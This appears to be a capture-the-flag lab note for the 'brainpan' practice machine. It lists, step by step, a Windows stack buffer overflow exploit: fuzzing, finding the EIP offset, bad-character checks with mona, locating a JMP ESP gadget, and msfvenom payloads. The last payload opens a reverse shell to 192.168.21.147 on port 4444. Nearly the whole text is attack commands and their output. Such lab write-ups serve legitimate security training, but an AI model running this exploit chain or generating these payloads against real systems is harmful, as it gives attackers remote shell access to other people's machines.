# brainpan

```
python3 1-Fuzzing.py -ip 192.168.21.140 -sp 9999 -lt A 

!mona config -set workingfolder C:\Users\<USER>\Desktop\brainpan

!mona pattern_create 600 or msf-pattern_create -l 600

python3 2-EIP.py -ip 192.168.21.140 -sp 9999 -pt Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
	
EIP value: 35724134

!mona pattern_offset 35724134 or msf-pattern_offset -l 600 -q 35724134
	
	The offset value is: 524
	
python3 3-EIP_Overwrite.py -ip 192.168.21.140 -sp 9999 -ep 524 -lt B -sh 400

!mona bytearray

	Add badchars

python3 4-BadChars.py
	
	\x00 is badchar

!mona compare -f "C:\Users\<user>\Desktop\brainpan\bytearray.bin" -a 0x31170000 #esp address  0x022FD90
 
!mona modules

!mona find -s "\xff\xe4" -m B.exe

 	0x311712f3 (\xf3\x12\x17\x31)

msfvenom --platform windows --arch x86 --payload windows/exec CMD=calc.exe EXITFUNC=thread --encoder x86/shikata_ga_nai  --bad-chars "\x00" --format python

python2 5-OpenCalc.py

msfvenom --platform windows --arch x86 --payload windows/shell_reverse_tcp LHOST=192.168.21.147 LPORT=4444 EXITFUNC=thread --encoder x86/shikata_ga_nai  --bad-chars '\x00' --format python

python2 6-Exploit.py

```
